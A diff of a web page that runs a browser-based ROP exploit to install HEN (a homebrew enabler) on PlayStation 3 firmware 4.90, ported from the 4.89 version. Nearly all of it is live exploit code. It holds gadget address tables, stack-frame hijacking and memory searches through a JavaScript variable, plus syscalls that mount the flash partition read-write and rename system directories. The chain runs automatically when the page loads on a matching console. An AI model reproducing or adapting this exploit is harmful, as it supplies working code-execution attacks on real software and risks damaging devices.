@@ -1,7 +1,7 @@
-<title>Auto HEN 4.89</title>
-<link rel="stylesheet" href="style1.css">
+<title>Auto HEN 4.90</title>
+<link rel="stylesheet" href="style.css">
 <center>
-<h1><span style='color:blue'>Host alternativo para instalar HEN en HFW 4.89</span></h1>
+<h1><span style='color:blue'>Host alternativo para instalar HEN en HFW 4.90</span></h1>
 <hr>
 <h2><span style='color:black'>Esto instalará HEN de forma áutomatica en tu PS3</span></h2>
 <hr>
@@ -9,7 +9,7 @@
 <div id="exploit"></div>
 <div id="trigger" style="display: none;"></div>
 <script>
-var sf_swap_addr=0x172D3A0,xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,offset_array=[],t_out=0,search_max_threshold,search_base,search_size,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=0x8FD8DCC0,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4b_addr=0x42C778,gadget_mod4c_addr=0x054AF0,gadget_mod9_addr=0x010B20,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget12_addr=0x0C864C,ua = navigator.userAgent,fwv = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple")),base_file="/dev_hdd0/theme/HEN.P3T",fail_msg_frag="<h2><span style='color:red'>Inicializacion fallo. Cierre el navegador y vuelva a intentarlo.</span></h2>",progress_msg_frag1="<h2>Inicializando... ",progress_msg_frag2='%</h2>',flash_partition='xxxxCELL_FS_IOS:BUILTIN_FLSH1',filesystem='CELL_FS_FAT',mount_path='/dev_blind',toc_addr=7296344,gadget1_addr=620036,gadget9_addr=170760,gadget10_addr=6479908,gadget11_addr=5874864,gadget12_addr=820812,gadget13_addr=4777384,gadget14_addr=4769696,gadget15_addr=4758664,gadget_mod1_addr=6352856,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod4b_addr=4376440,gadget_mod4c_addr=346864,gadget_mod5_addr=4339932,gadget_mod6_addr=134144,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget_mod9_addr=68384,gadget_mod10_addr=1857428,gadget_mod11_addr=1618244,gadget_mod12_addr=6500860,gadget_mod13_addr=3369072,gadget_mod14_addr=6502656,gadget_mod15_addr=3788856,gadget_mod16_addr=5206828;
+var sf_swap_addr=0x1C25C40,xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,offset_array=[],t_out=0,search_max_threshold,search_base,search_size,search_base_off=0,search_size_ext=0,gtemp_addr=0x8D000000,total_loops=0,max_loops=20,frame_fails=0,sp_exit=0x8FD8DCC0,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=0x6F5558,gadget1_addr=0x097604,gadget8_addr=0x020000,gadget_mod1_addr=0x60EFD0,gadget_mod2_addr=0x013B74,gadget_mod3_addr=0x0B8E00,gadget_mod4b_addr=0x42C774,gadget_mod4c_addr=0x054AF0,gadget_mod9_addr=0x010B20,gadget_mod4a_addr=0x0D9684,gadget_mod7_addr=0x01A6AC,gadget_mod8_addr=0x2BACB4,gadget12_addr=0x0C864C,ua = navigator.userAgent,fwv = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple")),base_file="/dev_hdd0/theme/HEN.P3T",fail_msg_frag="<h2><span style='color:red'>Initialization failed. Close the browser and try again.</span></h2>",progress_msg_frag1="<h2>Initializing... ",progress_msg_frag2='%</h2>',flash_partition='xxxxCELL_FS_IOS:BUILTIN_FLSH1',filesystem='CELL_FS_FAT',mount_path='/dev_blind',gadget9_addr=0x029B08,gadget10_addr=0x62E01C,gadget11_addr=0x59A4AC,gadget12_addr=0x0C864C,gadget13_addr=0x48E5A4,gadget14_addr=0x48C79C,gadget15_addr=0x489C84,gadget_mod1_addr=0x60EFD0,gadget_mod2_addr=0x013B74,gadget_mod3_addr=0x0B8E00,gadget_mod4a_addr=0x0D9684,gadget_mod4b_addr=0x42C774,gadget_mod4c_addr=0x054AF0,gadget_mod5_addr=0x4238D8,gadget_mod6_addr=0x020C00,gadget_mod7_addr=0x01A6AC,gadget_mod8_addr=0x2BACB4,gadget_mod9_addr=0x010B20,gadget_mod10_addr=0x1C5794,gadget_mod11_addr=0x18B144,gadget_mod12_addr=0x6331F4,gadget_mod13_addr=0x33686C,gadget_mod14_addr=0x6338F8,gadget_mod15_addr=0x39D034,gadget_mod16_addr=0x4F7328;
 function store_word(store_offset,val,r29out,r30out,r31out)
 {
 	r29out=gtemp_addr;
@@ -17,6 +17,19 @@ function store_word(store_offset,val,r29out,r30out,r31out)
 	r31out=gtemp_addr;
 	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(store_offset-0xC74)+fill_by_16bytes(0x10,dbyte41)
 	+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
+function s2hex(str)
+{
+    var hex = [];
+    var  i = 0;
+    for (;i < str.length; i++) {
+        hex.push(hex16(str.charCodeAt(i).toString(16)));
+    }
+    return hex.join("");
+}
+function hex16(s)
+{
+    return ('0000' + s).slice(-4)
 }
 function stack_frame_swap(new_stack_addr)
 {
@@ -194,7 +207,7 @@ function load_check()
 	if(total_loops<max_loops)
 	{
 		showMsg(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
-		t_out=setTimeout(initROP,150,false);
+		t_out=setTimeout(initROP,100,false);
 	}
 	else
 	{
@@ -203,44 +216,21 @@ function load_check()
 		t_out=0;
 	}
 }
-function findJsVariableOffset(name,exploit_data,base,size)
+function findJsVariableOffset(name,exploit_data,base,size,end)
 {
-	readMemory(base,size);
-	var dat=document.getElementById('exploit').style.src.substr(6,size);
-	var i=0;
-	var t;
-	var k;
-	var match;
-	var exploit_addr;
-	while(i<(dat.length*2))
-	{
-		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
-		{
-			match=0;
-			for (k=0;k<(exploit_data.length*2);k+=0x2)
-			{
-				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2)){break;}
-				match+=1;
-			}
-			if (match===exploit_data.length)
-			{
-				exploit_addr=base+i+4;
-				
-				for(t=0;t<offset_array.length;t+=1)
-				{
-					if(offset_array[t]===exploit_addr)
-					{
-						return -1;
-					}
-				}
-				offset_array.push(exploit_addr);
-				return exploit_addr;
-			}
-		}
-		i+=0x10;
-	}
-	var end_range=base+size;
-	return 0;
+    var block = 0;
+    while((base + block * size) < end)
+    {
+        readMemory(base + block * size, size);
+        var offset = document.getElementById('exploit').style.src.substr(6,size).indexOf(exploit_data);
+        if(offset > 0)
+        {
+            return base + block * size + (offset * 2) + 4;
+        }
+        
+        block++;
+    }
+    return 0;
 }
 function stack_frame_hookup()
 {
@@ -296,13 +286,19 @@ function initROP(init)
 		+base_file.convert()
 		+filesystem.convert()
 		+mount_path.convert()
+		// Only needed for HEN directories
+		+unescape("\u0000\u0000")
+		+"/dev_blind/vsh/resource/silk/xai/widgets/informationboard".convert()
+		+"/dev_blind/vsh/resource/silk/xai/widgets".convert()
+		+"/dev_blind/vsh/resource/silk/xai".convert()
+		+"/dev_blind/vsh/resource/AAA".convert()
 		+unescape("\uFD7E");
 
 		while(xtra_data_addr===0)
 		{
 			if(search_max_threshold<search_size){load_check();return;}
 			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
-			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);
+			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size,search_base+search_max_threshold);
 			search_max_threshold-=search_size;
 		}
 
@@ -311,6 +307,11 @@ function initROP(init)
 		fs_addr=base_file_addr+base_file.convertedSize();
 		mount_path_addr=fs_addr+filesystem.convertedSize();
 
+		hen_renamedir_addr1=xtra_data_addr+0x5A;
+		hen_renamedir_addr2=xtra_data_addr+0x96;
+		hen_renamedir_addr3=xtra_data_addr+0xC0;
+		hen_renamedir_addr4=xtra_data_addr+0xE2;
+
 		stack_frame=stack_frame_hookup()
 		+syscall(0x345,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
 		+store_word(0x8a000004+sf_swap_addr,sp_exit)
@@ -318,6 +319,13 @@ function initROP(init)
 		+syscall(0x321,base_file_addr,0x0,0x8e000000,0,0,0,0,0)
 		+syscall_r3r5_p2p(0x322,0x8e000000,0x8a000000,0x11000,0x8e000008,0,0,0,0,0,0)
 		+syscall(0x32E,base_file_addr,0,0,0,0,0,0,0)
+
+		// Must be changed depending on external stack frame (HEN only)
+		+syscall(0x32C,hen_renamedir_addr1,0x8a000000+0x1C25A44,0,0,0,0,0,0) // /dev_blind/hen
+		+syscall(0x32C,hen_renamedir_addr2,0x8a000000+0x1C25A77,0,0,0,0,0,0) // /dev_blind/hen/xml
+		+syscall(0x32C,hen_renamedir_addr3,0x8a000000+0x1C25A62,0,0,0,0,0,0) // /dev_blind/hen/remap
+		+syscall(0x32C,hen_renamedir_addr4,0x8a000000+0x1C25A8A,0,0,0,0,0,0) // /dev_blind/hen/remap/xml
+
 		+stack_frame_swap(0x8a000000+sf_swap_addr)
 		+stack_frame_exit();
 
@@ -325,7 +333,7 @@ function initROP(init)
 		{
 			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}load_check();return;}
 			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
-			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);
+			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext,search_base+search_max_threshold);
 			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;load_check();return;}
 			search_max_threshold-=search_size+search_size_ext;
 		}
@@ -335,7 +343,7 @@ function initROP(init)
 		{
 			if(search_max_threshold<search_size){load_check();return;}
 			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
-			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
+			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size,search_base+search_max_threshold);
 			if(jump_2_addr==-1)if(search_max_threshold<search_size){load_check();return;}
 			search_max_threshold-=search_size;
 		}
@@ -345,15 +353,15 @@ function initROP(init)
 		{
 			if(search_max_threshold<search_size){load_check();return;}
 			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
-			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
+			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size,search_base+search_max_threshold);
 			if(jump_1_addr==-1)if(search_max_threshold<search_size){load_check();return;}
 			search_max_threshold-=search_size;
 		}
 
-		var sf=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);
-		var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);
-		var j2=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);
-		var j1=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);
+		var sf=checkMemory(stack_frame_addr-0x4,0x10000,stack_frame.length);
+		var x=checkMemory(xtra_data_addr-0x4,0x2000,xtra_data.length);
+		var j2=checkMemory(jump_2_addr-0x4,0x2000,jump_2.length);
+		var j1=checkMemory(jump_1_addr-0x4,0x2000,jump_1.length);
 
 		if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
 		{
@@ -394,18 +402,28 @@ function HFWmsg()
 	showMsg("<h2><span style='color:red'>Asegurate de tener instalado el Firmware (HFW) 4.89 en tu consola antes de usar esto!</h2></span>");
 	throw new Error('');
 }
-if(fwv=="4.89"){initROP(true)}else{HFWmsg()}
+if(fwv=="4.90"){initROP(true)}else{HFWmsg()}
 </script>
-<br>
 <img border="5px" width="250" height="250" src="thewizwiki.png"></img>
 <h4 style="text-align:center; color: black" >Creado por TheWizWiki</h4>
-<br></br>
-<br></br>
-<br></br>
-<br></br>
-<br></br>
-<br></br>
-<br></br>
-<br></br>
-<br></br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<hr>
 <h3><span style='color:black'>Credits: Oficial PS3Xploit.com || PSX-Place.com || All PS3 Cominunity</span></h3>
